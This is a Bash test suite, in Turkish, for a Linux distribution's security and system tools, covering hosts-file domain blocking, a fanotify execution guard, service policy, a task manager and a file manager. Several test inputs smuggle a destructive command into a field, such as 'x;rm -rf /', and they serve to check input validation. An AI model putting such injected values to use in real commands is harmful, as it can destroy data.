    ! grep -qi 'error\|warning' <<<"$out" && ok "YARA dosyası motorda hatasız derlenir" || bad "YARA derleme uyarısı: $out"
    rm -rf "$T8"
else
    skip "clamscan kurulu değil, YARA kuralları motorda denenmedi"
fi

section "Web koruması (alan adı engeli)"
T9=$(mktemp -d); export T9
sed '/^case "\${1:-}" in/,$d' "$BIN/schway-defender" > "$T9/def.sh"
printf '127.0.0.1 localhost\n10.0.0.5 nas.local\n' > "$T9/hosts"
printf '# abuse.ch\n127.0.0.1\tbad-one.example.net\r\n127.0.0.1\tEVIL.Example.org\n127.0.0.1\t192.168.1.1\n127.0.0.1\tnot a domain;rm\n0.0.0.0\tdrop.example.com\n' > "$T9/feed.txt"
cat > "$T9/t.sh" <<'EOS'
export SD_STATE=$T9/state SD_CONF=$T9/def.conf SD_RUN=$T9/run SD_HOSTS=$T9/hosts SD_WEB_BLOCK=$T9/web.block SD_WEB_ALLOW=$T9/web.allow SD_WEB_URL=file://$T9/feed.txt SD_WEB_PROTO==file
. $T9/def.sh
need_root() { :; }
init_dirs
case "$1" in
  cmd) shift; web_cmd "$@" ;;
  update-empty) : > $T9/feed.txt; web_update ;;
esac
EOS
w() { bash "$T9/t.sh" cmd "$@" 2>&1; }
w on >/dev/null
grep -q '^0.0.0.0 bad-one.example.net$' "$T9/hosts" && grep -q '^:: bad-one.example.net$' "$T9/hosts" && ok "liste indirilir, IPv4 ve IPv6 için engel yazılır" || bad "engel yazılmadı"
[ "$(w check evil.example.org)" = engelli ] && ok "büyük harf ve CRLF düzeltilir (EVIL.Example.org -> engelli)" || bad "normalleştirme hatalı"
[ "$(w check google.com)" = serbest ] && ok "listede olmayan alan adı serbest" || bad "yanlış engel"
! grep -q '192.168.1.1\|not a domain' "$T9/hosts" && ok "IP adresi ve bozuk satırlar hosts'a girmez" || bad "geçersiz satır hosts'a girdi"
grep -q '^10.0.0.5 nas.local$' "$T9/hosts" && grep -q '^127.0.0.1 localhost$' "$T9/hosts" && ok "kullanıcının kendi hosts satırları korunur" || bad "kullanıcı satırı silindi"
w add Custom.Bad.com >/dev/null; w allow drop.example.com >/dev/null
[ "$(w check custom.bad.com)" = engelli ] && [ "$(w check drop.example.com)" = serbest ] && ok "elle engelleme eklenir, izin listesi listeyi geçersiz kılar" || bad "özel liste hatalı"
w add 'x;rm -rf /' | grep -q 'Geçersiz' && w add localhost | grep -q 'Geçersiz' && ok "geçersiz alan adı ve localhost reddedilir" || bad "geçersiz giriş kabul edildi"
w on >/dev/null; w on >/dev/null
[ "$(grep -c 'BEGIN schway-web' "$T9/hosts")" = 1 ] && ok "tekrar açınca blok çoğalmaz" || bad "hosts bloğu çoğaldı"
bash "$T9/t.sh" update-empty 2>&1 | grep -q 'eski liste korundu' && [ "$(w check bad-one.example.net)" = engelli ] && ok "boş/bozuk liste gelirse eski liste korunur" || bad "boş liste mevcut listeyi sildi"
w off >/dev/null
! grep -q 'schway-web' "$T9/hosts" && grep -q '^10.0.0.5 nas.local$' "$T9/hosts" && [ "$(w check bad-one.example.net)" = serbest ] && ok "kapatınca engeller hosts'tan kalkar, kullanıcı satırları kalır" || bad "kapatma hosts'u temizlemedi"
rm -rf "$T9"

section "Çalıştırma öncesi engelleme (fanotify)"
EG="$BIN/schway-execguard"
python3 -m py_compile "$EG" 2>/dev/null && ok "schway-execguard Python söz dizimi geçerli" || bad "schway-execguard derlenmiyor"
rm -rf "$BIN/__pycache__"
[ -f "$A/etc/systemd/system/schway-defender-exec.service" ] && grep -q 'schway-execguard' "$A/etc/systemd/system/schway-defender-exec.service" && ok "engelleme systemd birimi var" || bad "exec birimi eksik"
grep -qx python packages.extra && ok "python paket listesinde" || bad "python eksik"
grep -q 'prevent) echo 0' "$BIN/schway-defender" && ok "engelleme varsayılan KAPALI (gerçek donanımda denenene kadar)" || bad "prevent varsayılanı yanlış"
SUDOERS="$A/usr/share/schway/sudoers-installed"
! grep -E 'NOPASS' "$SUDOERS" >/dev/null || true
nop=$(sed -n '/^Cmnd_Alias SCHWAY_NOPASS/,/^%wheel/p' "$SUDOERS")
! grep -qE 'prevent|ransom|web (on|off|add|remove|allow|unallow)|config set' <<<"$nop" && grep -q 'web update' <<<"$nop" && ok "kapatma/ayar komutları parola ister (yalnızca web update parolasız)" || bad "sudoers parolasız listesi hatalı"
grep -q 'prevent) prevent_cmd' "$BIN/schway-defender" && grep -q 'web) web_cmd' "$BIN/schway-defender" && grep -q 'ransom) ransom_cmd' "$BIN/schway-defender" && ok "ransom/web/prevent komutları dağıtıcıda (sudo ile aç/kapa)" || bad "komut dağıtıcıda eksik"
if [ "$EUID" -eq 0 ] && python3 - <<'EOF' 2>/dev/null
import ctypes,os,sys
l=ctypes.CDLL(None,use_errno=True); fd=l.fanotify_init(0x4|0x1,os.O_RDONLY); sys.exit(0 if fd>=0 else 1)
EOF
then
    T7=$(mktemp -d); mkdir -p "$T7/watched" "$T7/bin" "$T7/state"
    cat > "$T7/bin/clamdscan" <<'EOS'
#!/bin/bash
f="${@: -1}"
echo scan >> @T7@/scan.log
case "$(cat "$f" 2>/dev/null)" in
  *SCHWAY-EXECGUARD-TEST*) echo "$f: Schway.TestMalware FOUND"; exit 1 ;;
  *SLOWSCAN*) sleep 5; echo "$f: OK"; exit 0 ;;
  *BROKENSCAN*) echo "ERROR: clamd yok"; exit 2 ;;
esac
echo "$f: OK"; exit 0
EOS
    printf '#!/bin/bash\necho "$@" >> @T7@/blocked.log\n' > "$T7/bin/defender"
    sed -i "s|@T7@|$T7|g" "$T7/bin/clamdscan" "$T7/bin/defender"; chmod +x "$T7"/bin/*
    printf '#!/bin/bash\necho CLEAN-RAN\n' > "$T7/watched/clean.sh"
    printf '#!/bin/bash\n# SCHWAY-EXECGUARD-TEST\necho BAD-RAN\n' > "$T7/watched/bad.sh"
    printf '#!/bin/bash\n# SLOWSCAN\necho SLOW-RAN\n' > "$T7/watched/slow.sh"
    printf '#!/bin/bash\n# BROKENSCAN\necho BROKEN-RAN\n' > "$T7/watched/broken.sh"
    cp "$T7/watched/bad.sh" "$T7/watched/bad2.sh"
    chmod +x "$T7"/watched/*.sh
    printf 'prevent=1\nmaxsize=100\n' > "$T7/def.conf"
    start_guard() {  # start_guard zaman_aşımı_sn
        rm -f "$T7/pid" "$T7/guard.log"
        ( export SD_STATE=$T7/state SD_CONF=$T7/def.conf SD_EXCL=$T7/excl SD_CLAMDSCAN=$T7/bin/clamdscan SD_DEFENDER=$T7/bin/defender SD_EXEC_PREFIXES=$T7/watched/ SD_EXEC_TIMEOUT=$1 SD_GAMEFLAG=/nonexistent/x
          export T7 EG; exec bash -c 'echo $$ > "$T7/pid"; exec python3 "$EG"' ) > "$T7/guard.log" 2>&1 < /dev/null &
        for _ in $(seq 1 40); do grep -q 'başladı' "$T7/guard.log" 2>/dev/null && return 0; sleep 0.25; done; return 1
    }
    stop_guard() { [ -f "$T7/pid" ] && kill "$(cat "$T7/pid")" 2>/dev/null; for _ in $(seq 1 20); do kill -0 "$(cat "$T7/pid" 2>/dev/null)" 2>/dev/null || return 0; sleep 0.25; done; kill -9 "$(cat "$T7/pid")" 2>/dev/null; }
    scans() { wc -l < "$T7/scan.log" 2>/dev/null || echo 0; }
    if start_guard 2; then
        ok "schway-execguard gerçek çekirdekte (fanotify) başlar"
        [ "$(timeout 20 "$T7/watched/clean.sh" 2>&1)" = CLEAN-RAN ] && ok "temiz dosya çalışır" || bad "temiz dosya çalışmadı"
        timeout 20 "$T7/watched/clean.sh" >/dev/null 2>&1; [ "$(scans)" = 1 ] && ok "ikinci çalıştırmada yeniden taranmaz (önbellek)" || bad "önbellek çalışmadı: $(scans) tarama"
        out=$(timeout 20 "$T7/watched/bad.sh" 2>&1); [[ $out != *BAD-RAN* ]] && [[ $out == *"not permitted"* || $out == *"izin"* || $out == *ermission* ]] && ok "tehdit içeren dosya ÇALIŞTIRILMAZ (Operation not permitted)" || bad "tehdit dosyası çalıştı: $out"
        for _ in $(seq 1 20); do grep -q 'bad.sh Schway.TestMalware' "$T7/blocked.log" 2>/dev/null && break; sleep 0.25; done
        grep -q '_execblocked .*bad.sh Schway.TestMalware' "$T7/blocked.log" && ok "engelleme schway-defender'a (karantina/bildirim) doğru imzayla bildirilir" || bad "yönetici betiği çağrılmadı"
        [ "$(timeout 20 "$T7/watched/slow.sh" 2>&1)" = SLOW-RAN ] && ok "tarama zaman aşımında dosya çalışır (fail-open)" || bad "zaman aşımında engellendi"
        [ "$(timeout 20 "$T7/watched/broken.sh" 2>&1)" = BROKEN-RAN ] && ok "tarayıcı hata verirse dosya çalışır (fail-open)" || bad "tarayıcı hatasında engellendi"
        n=$(scans); /usr/bin/true; bash -c 'true'
        [ "$(scans)" = "$n" ] && ok "sistem klasörlerindeki programlar taranmaz" || bad "sistem programı tarandı"
        echo "# degisti" >> "$T7/watched/clean.sh"; n=$(scans); timeout 20 "$T7/watched/clean.sh" >/dev/null 2>&1
        [ "$(scans)" -gt "$n" ] && ok "değişen dosya yeniden taranır" || bad "değişen dosya taranmadı"
        echo "$T7/watched/bad2.sh" > "$T7/excl"; sleep 4
        [ "$(timeout 20 "$T7/watched/bad2.sh" 2>&1)" = BAD-RAN ] && ok "dışlanan yoldaki dosya taranmaz" || bad "dışlama çalışmadı"
        printf 'prevent=0\n' > "$T7/def.conf"; sleep 4
        [ "$(timeout 20 "$T7/watched/bad.sh" 2>&1)" = BAD-RAN ] && ok "prevent=0 yapılınca engelleme durur" || bad "prevent=0 etkisiz"
        printf 'prevent=1\n' > "$T7/def.conf"
        stop_guard
        [ "$(timeout 20 "$T7/watched/bad.sh" 2>&1)" = BAD-RAN ] && ok "servis durunca hiçbir şey engellenmez" || bad "servis durunca engel sürdü"
    else bad "schway-execguard başlamadı: $(cat "$T7/guard.log" 2>/dev/null | head -3)"; fi
    printf 'prevent=1\n' > "$T7/def.conf"; : > "$T7/excl"
    if start_guard 30; then
        ( sleep 1.5; kill -9 "$(cat "$T7/pid")" ) &
        s=$(date +%s); out=$(timeout 25 "$T7/watched/slow.sh" 2>&1); e=$(date +%s)
        [ "$out" = SLOW-RAN ] && [ $((e - s)) -lt 5 ] && ok "servis tarama sırasında SIGKILL ile ölse bile bekleyen çalıştırma serbest kalır (kilitlenme yok)" || bad "servis ölünce çalıştırma takıldı ($((e - s)) sn, $out)"
        wait 2>/dev/null
    else bad "ikinci başlatma başarısız"; fi
    stop_guard 2>/dev/null; rm -rf "$T7"
else
    skip "kök yetkisi ya da fanotify yok: çalıştırma öncesi engelleme çekirdek testleri atlandı (sudo bash tests/run.sh ile çalıştır)"
fi

section "Arayüz: geçmiş türleri, ana sayfa kartları, ekran görüntüsü testi"
QS="$A/etc/skel/.config/quickshell"
kinds=$(grep -v '^[[:space:]]*#' "$BIN/schway-defender" | grep -v 'hist()' | grep -oE '(^|[^A-Za-z_])hist [a-z]{3,}' | awk '{print $2}' | sort -u)
miss=0; for k in $kinds; do grep -q "h.kind === \"$k\"" "$QS/Security.qml" || { miss=1; bad "geçmiş türü arayüzde çevrilmemiş (ham kelime görünür): $k"; }; done
[ $miss = 0 ] && ok "arka ucun yazdığı tüm geçmiş türleri arayüzde Türkçe karşılanır ($(echo $kinds | wc -w) tür)" || true
for t in lock web run; do grep -q "$t: String.fromCodePoint" "$QS/Defender.qml" || bad "Defender.glyph.$t yok"; done
grep -q 'Defender.ransomInfo' "$QS/Security.qml" && grep -q 'Defender.webInfo' "$QS/Security.qml" && grep -q 'Defender.preventInfo' "$QS/Security.qml" && ok "ana sayfa kartlarında fidye, web ve çalıştırma öncesi koruma var" || bad "ana sayfa yeni koruma kartları eksik"
grep -q 'SecHead' "$QS/Security.qml" && [ -f "$QS/SecHead.qml" ] && grep -q 'property string status' "$QS/SecRow.qml" && ok "ayarlar bölümlere ayrılmış, satırlarda durum göstergesi var" || bad "ayar bölümleri/durum satırı eksik"
grep -qE 'width: 20; horizontalAlignment' "$QS/Security.qml" && ok "kenar çubuğu simgeleri sabit genişlikte (yazı kaymaz)" || bad "nav simge hizası bozulmuş"
if python3 -c "import PySide6" >/dev/null 2>&1; then
    T10=$(mktemp -d)
    for sc in ok busy threat; do
        timeout 120 python3 tests/qml/shots/run_shots.py "$QS" "$sc" 0,1,2,3,4,5 "$T10" Security >"$T10/$sc.log" 2>&1 && ok "Güvenlik uygulaması 6 sayfa render edildi, QML hatası yok ($sc senaryosu)" || { bad "Güvenlik render ($sc)"; tail -8 "$T10/$sc.log"; }
    done
    timeout 120 python3 tests/qml/shots/run_shots.py "$QS" busy 9 "$T10" Settings >"$T10/set.log" 2>&1 && ok "Ayarlar > Virüs ve Tehdit Koruması sayfası render edildi, QML hatası yok" || { bad "Ayarlar render"; tail -8 "$T10/set.log"; }
    python3 - "$T10" <<'PY' && ok "ekran görüntüleri boş değil (gerçekten çizildi)" || bad "ekran görüntüsü boş/çok küçük"
import sys, glob, os
fs = glob.glob(sys.argv[1] + "/*.png")
sys.exit(0 if len(fs) >= 14 and all(os.path.getsize(f) > 20000 for f in fs) else 1)
PY
    rm -rf "$T10"
else skip "PySide6 kurulu değil, arayüz ekran görüntüsü testleri atlandı"; fi

section "Hizmet politikası (açılışta yalnızca gerekenler)"
POL="$A/usr/share/schway/services.policy"
pol() { grep -vE '^[[:space:]]*(#|$)' "$POL" | awk -v k="$1" '$1==k{print $2}'; }
[ -f "$POL" ] && ok "services.policy var" || bad "services.policy yok"
for u in sshd.service ModemManager.service pcscd.socket systemd-time-wait-sync.service iwd.service systemd-networkd.service; do
    pol remove | grep -qxF "$u" && ok "politika: $u açılıştan kaldırılır" || bad "politikada remove yok: $u"
done
pol package-remove | grep -qx cloud-init && ok "politika: cloud-init paketi çıkarılır" || bad "cloud-init package-remove yok"
leak=0; for u in $(pol remove); do grep -E "ln -sf.*${u%.*}" build-iso.sh >/dev/null 2>&1 && { leak=1; bad "kaldırılan hizmet build-iso.sh'de yeniden etkinleştiriliyor: $u"; }; done
[ $leak = 0 ] && ok "kaldırılan hizmetler build-iso.sh'de geri açılmıyor" || true
miss=0; for u in $(pol boot); do n=${u%.service}; n=${n%.timer}; grep -q "$n" build-iso.sh "$A/etc/calamares/schway/boot-extras.sh" || { miss=1; bad "boot hizmeti hiçbir yerde etkinleştirilmiyor: $u"; }; done
[ $miss = 0 ] && ok "politikadaki tüm 'boot' hizmetleri gerçekten etkinleştirilir ($(pol boot | wc -l) hizmet)" || true
grep -q '^PermitRootLogin no' "$A/etc/ssh/sshd_config.d/10-schway.conf" && grep -q '10-archiso.conf' build-iso.sh && ok "SSH: kök girişi kapalı; releng'in 'PermitRootLogin yes' dosyası derlemede silinir" || bad "sshd yapılandırması güvensiz"
# Sentetik releng profili: releng'in gerçek hizmet adlarıyla; build-iso.sh'in hizmet bölümünü çalıştır
TP=$(mktemp -d); S="$TP/profile/airootfs/etc/systemd/system"; mkdir -p "$S/multi-user.target.wants" "$S/sockets.target.wants" "$S/sysinit.target.wants" "$S/cloud-init.target.wants" "$S/network-online.target.wants" "$TP/profile/airootfs/etc/ssh/sshd_config.d"
for u in ModemManager choose-mirror hv_fcopy_daemon hv_kvp_daemon hv_vss_daemon iwd livecd-talk pacman-init sshd systemd-networkd systemd-resolved vboxservice vmtoolsd vmware-vmblock-fuse reflector; do ln -s "/usr/lib/systemd/system/$u.service" "$S/multi-user.target.wants/$u.service"; done
ln -s x "$S/sockets.target.wants/pcscd.socket"; ln -s x "$S/sockets.target.wants/systemd-networkd.socket"; ln -s x "$S/sysinit.target.wants/systemd-time-wait-sync.service"; ln -s x "$S/sysinit.target.wants/systemd-timesyncd.service"
ln -s x "$S/cloud-init.target.wants/cloud-init-local.service"; ln -s x "$S/network-online.target.wants/systemd-networkd-wait-online.service"; ln -s x "$S/livecd-alsa-unmuter.service"; mkdir -p "$S/sound.target.wants"; ln -s x "$S/sound.target.wants/livecd-alsa-unmuter.service"
echo "PermitRootLogin yes" > "$TP/profile/airootfs/etc/ssh/sshd_config.d/10-archiso.conf"; printf 'cloud-init\nbase\n' > "$TP/profile/packages.x86_64"
awk '/^# --- Servisler: usr\/share\/schway\/services.policy/{f=1} /^# --- Kimlik ve izinler/{f=0} f' build-iso.sh > "$TP/snippet.sh"
out=$(HERE="$PWD" PROFILE="$TP/profile" bash -c 'set -e; . '"$TP"'/snippet.sh' 2>&1); rc=$?
left=$(find "$S" -path '*.wants/*' -printf '%f\n' | sort -u | tr '\n' ' ')
[ $rc = 0 ] && ok "build-iso.sh hizmet bölümü sentetik releng profilinde hatasız çalışır" || bad "hizmet bölümü hata verdi: $out"
for u in sshd.service ModemManager.service pcscd.socket systemd-time-wait-sync.service iwd.service systemd-networkd.service systemd-networkd.socket reflector.service; do
    grep -qw -- "$u" <<<"$left" && bad "hâlâ etkin: $u" || true
done
! grep -qwE 'sshd.service|ModemManager.service|pcscd.socket|iwd.service|systemd-networkd.service' <<<"$left" && ok "sshd, ModemManager, pcscd, networkd, iwd, time-wait-sync açılıştan kalktı" || bad "kalan: $left"
grep -qw NetworkManager.service <<<"$left" && grep -qw earlyoom.service <<<"$left" && grep -qw systemd-timesyncd.service <<<"$left" && grep -qw systemd-resolved.service <<<"$left" && ok "gerekli hizmetler (NetworkManager, earlyoom, timesyncd, resolved) açılışta kalır" || bad "gerekli hizmet silinmiş: $left"
[ ! -e "$TP/profile/airootfs/etc/ssh/sshd_config.d/10-archiso.conf" ] && [ "$(grep -c '^cloud-init$' "$TP/profile/packages.x86_64")" = 0 ] && grep -q '^base$' "$TP/profile/packages.x86_64" && ok "releng sshd ayarı silinir, cloud-init paketi çıkar, diğer paketler kalır" || bad "dosya/paket temizliği hatalı"
! grep -q UYARI <<<"$out" && ok "denetim: politikada olmayan etkin hizmet yok" || bad "beklenmeyen hizmet uyarısı: $out"
ln -s x "$S/multi-user.target.wants/gizli-hizmet.service"
out2=$(HERE="$PWD" PROFILE="$TP/profile" bash -c 'set -e; . '"$TP"'/snippet.sh' 2>&1); grep -q 'gizli-hizmet.service' <<<"$out2" && ok "denetim: politikada olmayan yeni hizmet uyarı verir" || bad "denetim yeni hizmeti yakalamadı"
HERE="$PWD" PROFILE="$TP/profile" SCHWAY_STRICT_SERVICES=1 bash -c 'set -e; . '"$TP"'/snippet.sh' >/dev/null 2>&1 && bad "STRICT modu derlemeyi durdurmadı" || ok "SCHWAY_STRICT_SERVICES=1 beklenmeyen hizmette derlemeyi durdurur"
rm -rf "$TP"

section "Görev Yöneticisi arka ucu (schway-tasks)"
TK="$BIN/schway-tasks"
python3 -m py_compile "$TK" 2>/dev/null && ok "schway-tasks Python söz dizimi geçerli" || bad "schway-tasks derlenmiyor"; rm -rf "$BIN/__pycache__"
[ -f "$A/usr/share/schway/tasks/shell.qml" ] && [ -f "$A/usr/share/applications/schway-tasks.desktop" ] && grep -q 'schway-tasks gui' "$A/etc/skel/.config/hypr/hyprland.conf" && ok "arayüz, menü girişi ve Ctrl+Shift+Esc kısayolu var" || bad "tasks arayüz/menü/kısayol eksik"
SCHWAY_TASKS_RUN=$(mktemp -d); export SCHWAY_TASKS_RUN SCHWAY_POLICY="$POL"
sm=$(python3 "$TK" summary); grep -q '^mem_total_mb=[1-9]' <<<"$sm" && grep -q '^cores=' <<<"$sm" && grep -qE '^cpu=[0-9.]+$' <<<"$sm" && ok "summary: işlemci, bellek, çekirdek, yük alanları var" || bad "summary eksik: $sm"
ls=$(python3 "$TK" list); [ "$(awk -F'\t' 'NF==8' <<<"$ls" | wc -l)" = "$(wc -l <<<"$ls")" ] && [ "$(wc -l <<<"$ls")" -gt 3 ] && ok "list: her satır 8 sütun ($(wc -l <<<"$ls") işlem)" || bad "list biçimi bozuk"
python3 -c 'while True: pass' >/dev/null 2>&1 & BUSY=$!
python3 "$TK" list >/dev/null; sleep 1.2
cpu=$(python3 "$TK" list | awk -F'\t' -v p=$BUSY '$1==p{print $3}')
kill -9 $BUSY 2>/dev/null; wait $BUSY 2>/dev/null
[ -n "$cpu" ] && awk -v c="$cpu" 'BEGIN{exit !(c>20)}' && ok "işlemci yüzdesi ANLIK ölçülür (boşta dönen işlem %$cpu)" || bad "anlık işlemci ölçümü hatalı: '$cpu'"
python3 "$TK" kill 1 2>&1 | grep -q 'sonlandırılamaz' && python3 "$TK" kill abc 2>&1 | grep -q 'Geçersiz' && python3 "$TK" kill 99999999 2>&1 | grep -q 'bulunamadı' && ok "kill: PID 1, geçersiz ve olmayan işlem reddedilir" || bad "kill doğrulaması hatalı"
sleep 300 >/dev/null 2>&1 & SL=$!
python3 "$TK" kill $SL >/dev/null 2>&1; sleep 0.4
kill -0 $SL 2>/dev/null && { bad "kill işlemi sonlandırmadı"; kill -9 $SL; } || ok "kill: kendi işlemini sonlandırır (SIGTERM)"
wait $SL 2>/dev/null
kt=$(python3 "$TK" list | awk -F'\t' '$8 ~ /k/' | wc -l); [ "$kt" -ge 0 ] && python3 "$TK" list | awk -F'\t' '$8 ~ /k/{print $1; exit}' | { read -r kp; [ -z "$kp" ] && true || python3 "$TK" kill "$kp" 2>&1 | grep -q 'Çekirdek' ; } && ok "çekirdek iş parçacıkları sonlandırılamaz" || bad "çekirdek iş parçacığı korunmuyor"
mkdir -p "$SCHWAY_TASKS_RUN/bin"; cp "tests/qml/shots/fake-systemctl" "$SCHWAY_TASKS_RUN/bin/systemctl"; export SCHWAY_SYSTEMCTL="$SCHWAY_TASKS_RUN/bin/systemctl"
sv=$(python3 "$TK" services); [ "$(awk -F'\t' 'NF==6' <<<"$sv" | wc -l)" = "$(wc -l <<<"$sv")" ] && grep -q $'^NetworkManager.service\tactive\tenabled\t30.0\tNetwork Manager\tessential' <<<"$sv" && ok "services: 6 sütun, bellek MB, politika (essential) alanı" || bad "services biçimi: $sv"
grep -q $'^docker.service\tfailed' <<<"$sv" && grep -q $'^bluetooth.service\tinactive\tenabled\t-' <<<"$sv" && ok "services: başarısız/çalışmayan hizmet ve geçersiz bellek değeri '-' olur" || bad "services durum/bellek ayrıştırması"
for u in NetworkManager.service systemd-logind.service dbus-broker.service polkit.service; do python3 "$TK" service stop "$u" 2>&1 | grep -q 'zorunludur' || bad "zorunlu hizmet kapatılabiliyor: $u"; done; ok "zorunlu hizmetler (NetworkManager, logind, dbus, polkit) kapatılamaz"
python3 "$TK" service disable 'x;rm.service' 2>&1 | grep -q 'Geçersiz' && python3 "$TK" service stop foo 2>&1 | grep -q 'Geçersiz' && python3 "$TK" service zap sshd.service 2>&1 | grep -q 'Kullanım' && ok "service: geçersiz birim adı ve eylem reddedilir" || bad "service doğrulaması"
[ "$EUID" -eq 0 ] && { python3 "$TK" service disable sshd.service | grep -q 'Açılışta başlamayacak' && ok "izinli hizmet kapatılır (kök, sahte systemctl)" || bad "izinli hizmet işlemi"; } || skip "kök değil: hizmet kapatma testi atlandı (pkexec/sudo ister)"
! grep -qE 'schway-tasks' "$A/usr/share/schway/sudoers-installed" && ok "sudoers: hizmet yönetimi parolasız listesinde DEĞİL (yönetici onayı ister)" || bad "schway-tasks sudoers parolasız listesinde"
unset SCHWAY_SYSTEMCTL SCHWAY_POLICY; rm -rf "$SCHWAY_TASKS_RUN"; unset SCHWAY_TASKS_RUN

section "Dosyalar arka ucu (schway-files)"
FB="$BIN/schway-files"
python3 -m py_compile "$FB" 2>/dev/null && ok "schway-files Python söz dizimi geçerli" || bad "schway-files derlenmiyor"; rm -rf "$BIN/__pycache__"
[ -f "$A/usr/share/schway/files/shell.qml" ] && [ -f "$A/usr/share/applications/schway-files.desktop" ] && grep -q '^bind = \$mod, E, exec, \$files' "$A/etc/skel/.config/hypr/hyprland.conf" && grep -q 'schway-files gui' "$A/etc/skel/.config/hypr/hyprland.conf" && grep -q 'ALT, E, exec, thunar' "$A/etc/skel/.config/hypr/hyprland.conf" && ok "arayüz, menü girişi, Super+E ve yedek Thunar kısayolu var" || bad "files arayüz/menü/kısayol eksik"
TF=$(mktemp -d); export HOME_BAK=$HOME; fh="$TF/home"; mkdir -p "$fh/Documents/alt" "$fh/Downloads" "$fh/Desktop" "$fh/.config"
fe() { HOME="$fh" XDG_DATA_HOME="$fh/.local/share" XDG_CONFIG_HOME="$fh/.config" SCHWAY_FILES_MOUNTINFO="$TF/mi" python3 "$FB" "$@"; }
printf '36 28 0:30 / /run/media/schway/FLASH rw - vfat /dev/sdb1 rw\n37 28 0:31 / /sys rw - sysfs sysfs rw\n38 28 0:32 / /mnt/disk rw - ext4 /dev/sdc1 rw\n' > "$TF/mi"
echo hi > "$fh/Documents/not.txt"; echo x > "$fh/Documents/Rapor.PDF"; printf '#!/bin/sh\n' > "$fh/Documents/run.sh"; chmod +x "$fh/Documents/run.sh"; echo g > "$fh/Documents/.gizli"; ln -s "$fh/Documents/alt" "$fh/Documents/alt-link"
pl=$(fe places); grep -q $'^home\tEv\t' <<<"$pl" && grep -q $'^drive\tFLASH\t/run/media/schway/FLASH' <<<"$pl" && grep -q $'^drive\tdisk\t/mnt/disk' <<<"$pl" && ! grep -q '/sys' <<<"$pl" && grep -q $'^trash\tÇöp Kutusu\ttrash://' <<<"$pl" && ok "places: ev, klasörler, takılı diskler (sysfs hariç), çöp" || bad "places hatalı: $pl"
ls=$(fe list "$fh/Documents"); [ "$(head -1 <<<"$ls" | cut -f1,2)" = $'d\talt' ] && grep -q $'^f\tRapor.PDF\t[0-9]*\t[0-9]*\tdoc\t-' <<<"$ls" && grep -q $'^f\trun.sh\t[0-9]*\t[0-9]*\tcode\tx' <<<"$ls" && grep -q $'^d\talt-link\t.*\tdir\tl' <<<"$ls" && ! grep -q gizli <<<"$ls" && ok "list: klasörler önce, cins ve bayraklar (x, l), gizli dosya yok" || bad "list hatalı: $ls"
fe list "$fh/Documents" --hidden | grep -q $'\t.gizli\t' && ok "list --hidden gizli dosyaları gösterir" || bad "--hidden çalışmıyor"
fe list /yok 2>&1 | grep -q 'bulunamadı' && fe list "$fh/Documents/not.txt" 2>&1 | grep -q 'klasör değil' && ok "list: olmayan yol ve dosya için Türkçe hata" || bad "list hata mesajları"
fe mkdir "$fh/Documents" "Yeni Klasör" >/dev/null && [ -d "$fh/Documents/Yeni Klasör" ] && ok "mkdir klasör oluşturur" || bad "mkdir"
for n in "a/b" ".." "" "$(printf 'x%.0s' $(seq 1 300))"; do fe mkdir "$fh/Documents" "$n" >/dev/null 2>&1 && bad "geçersiz ad kabul edildi: '${n:0:20}'" ; done; ok "geçersiz adlar reddedilir (/, .., boş, 255 bayttan uzun)"
fe mkdir "$fh/Documents" "Yeni Klasör" 2>&1 | grep -q 'zaten var' && fe newfile "$fh/Documents" x.txt >/dev/null && [ -f "$fh/Documents/x.txt" ] && ok "var olan ad ezilmez; newfile boş dosya oluşturur" || bad "mkdir/newfile çakışma"
fe mkdir /etc x 2>&1 | grep -q 'oluşturulamaz' && ok "sistem klasöründe oluşturma reddedilir" || bad "/etc'de klasör açılabildi"
fe rename "$fh/Documents/not.txt" notlar.txt >/dev/null && [ -f "$fh/Documents/notlar.txt" ] && fe rename "$fh/Documents/notlar.txt" Rapor.PDF 2>&1 | grep -q 'zaten var' && ok "rename çalışır; var olan adın üzerine yazmaz" || bad "rename"
for p in "$fh" "$fh/Documents" "$fh/Downloads" / "$fh/.local/share/Trash"; do fe rename "$p" yeni >/dev/null 2>&1 && bad "korunan yol yeniden adlandırıldı: $p"; fe trash "$p" >/dev/null 2>&1 && bad "korunan yol çöpe atıldı: $p"; fe delete "$p" >/dev/null 2>&1 && bad "korunan yol silindi: $p"; done; ok "korunan yollar (ev, Belgeler, İndirilenler, /, Çöp) değiştirilemez (rename/trash/delete)"
fe rename /etc/hostname h2 2>&1 | grep -q 'Yalnızca ev' && fe trash /etc/hostname >/dev/null 2>&1; [ -e /etc/hostname ] || [ ! -f /etc/hostname ] && ok "ev dışındaki sistem dosyaları değiştirilemez"
echo a > "$fh/Documents/ayni.txt"; fe trash "$fh/Documents/ayni.txt" >/dev/null; echo b > "$fh/Documents/ayni.txt"; fe trash "$fh/Documents/ayni.txt" >/dev/null
ti="$fh/.local/share/Trash"; [ -f "$ti/files/ayni.txt" ] && [ -f "$ti/files/ayni (2).txt" ] && grep -q '^Path=' "$ti/info/ayni.txt.trashinfo" && grep -qE '^DeletionDate=[0-9]{4}-[0-9]{2}-[0-9]{2}T' "$ti/info/ayni.txt.trashinfo" && ok "trash: FreeDesktop çöp biçimi (files/info, Path, DeletionDate), aynı adlar çakışmaz" || bad "çöp biçimi hatalı"
fe trashlist | awk -F'\t' 'NF==7' | wc -l | grep -q '^2$' && ok "trashlist: 7 sütun (kimlik, özgün yol, tarih, boyut, tür, cins, görünen ad)" || bad "trashlist biçimi"
fe trash "$fh/Documents/alt-link" >/dev/null; [ -d "$fh/Documents/alt" ] && [ ! -e "$fh/Documents/alt-link" ] && ok "sembolik bağlantı çöpe atılınca hedef klasör bozulmaz (bağlantı izlenmez)" || bad "symlink hedefi etkilendi"
fe restore ayni.txt >/dev/null; [ -f "$fh/Documents/ayni.txt" ] && ok "restore özgün yere geri koyar" || bad "restore"
echo z > "$fh/Documents/ayni.txt.yeni"; mv "$fh/Documents/ayni.txt.yeni" "$fh/Documents/ayni (2).txt"; fe restore "ayni (2).txt" >/dev/null; compgen -G "$fh/Documents/ayni (2)*.txt" >/dev/null && ok "restore: özgün yer doluysa üzerine yazmaz" || bad "restore çakışma"
fe copy "$fh/Downloads" "$fh/Documents/Rapor.PDF" >/dev/null; fe copy "$fh/Downloads" "$fh/Documents/Rapor.PDF" >/dev/null; [ -f "$fh/Downloads/Rapor.PDF" ] && [ -f "$fh/Downloads/Rapor (2).PDF" ] && [ -f "$fh/Documents/Rapor.PDF" ] && ok "copy: var olanın üzerine yazmaz ('Rapor (2).PDF'), kaynak kalır" || bad "copy"
